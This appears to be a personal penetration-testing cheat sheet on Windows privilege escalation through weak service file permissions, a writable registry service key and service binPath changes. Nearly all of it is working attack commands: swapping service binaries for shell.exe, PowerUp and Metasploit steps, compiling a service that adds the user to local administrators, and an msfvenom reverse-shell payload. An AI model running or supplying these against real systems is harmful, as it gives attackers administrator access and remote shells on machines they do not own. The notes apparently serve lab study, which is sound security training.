## Weak File Permissions
Manual:-
```powershell
wmic service get name,startname,pathname
# OR
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# Check access
accesschk64.exe -wvu "[PathName]"
# -v : Verbosity
# -u : Don't show errors
If Everyone group has “FILE_ALL_ACCESS” permission

cmd /c 'copy /y c:\Temp\shell.exe "c:\Program Files\File Permissions Service\filepermservice.exe"'
OR
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

# Check start mode of service (If Auto then restart PC)
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '[service_name]'}

sc stop filepermsvc & sc start filepermsvc
## OR
Restart-Service BetaService
## OR Restart PC if you don't have the permissions to restart the service
```

From [[Privilege Escalation/Windows PrivEsc/Automation]] Tools (PowerUp) :-
![[1_7NF8JFYj-YzYEfFD2x-H_A.webp]]
```powershell
Get-ModifiableServiceFile
Install-ServiceBinary -Name 'filepermsvc'
cmd /c 'copy /y C:\Temp\shell.exe "c:\Program Files\File Permissions Service\filepermservice.exe"'
# OR
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

# Check start mode of service
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like '[service_name]'}

sc stop filepermsvc & sc start filepermsvc 
# Or restart PC if you have SeShutdown Privilege
```

```sh
# Using Metasploit
use exploit/windows/local/service_permissions
```
---
## Registry Service
```powershell
powershell -ep bypass
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

# In Output, if “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over registry key :-
1. Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators [username] /add
2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_service.c -o x.exe # (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64') 
3. Copy the generated file x.exe, to the Windows VM in a Writable Folder like C:\Temp

In Windows VM:-
1. Open command prompt at type: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
2. sc start regsvc
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
```

OR SIMPLY USE a `shell.exe` from msfvenom

---
## BinPath
![[1_fSysETFs5-I2ZFmEghiz0A.webp]]

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=YOURIPHERE LPORT=6666 -f exe-service > shell.exe
```
```powershell
# Modify config path
sc config [Service_name] binpath= "C:\Users\user\Desktop\shell.exe"

sc qc daclsvc
sc start daclsvc
```

![[1_E85BnyPd47bDGs7626Kzqw.webp]]